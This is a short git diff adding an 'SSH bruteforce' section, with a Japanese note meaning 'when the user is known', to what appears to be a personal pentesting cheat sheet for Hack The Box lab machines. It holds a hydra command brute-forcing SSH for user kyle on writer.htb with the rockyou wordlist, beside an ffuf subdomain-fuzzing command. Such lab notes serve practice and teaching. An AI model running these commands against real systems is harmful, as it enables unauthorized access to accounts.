@@ -314,6 +314,17 @@ ffuf -c -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt -u http://schooled.ht
 [test] => 104
 [admin] => 106
 [root] => 581
+
+```
+
+### SSH bruteforce 
+
+ユーザーが分かっていた時
+
+```
+
+hydra -l kyle -P ~/rockyou.txt ssh://writer.htb -VV -f -t 60
+
 ```
 
 ### SCP
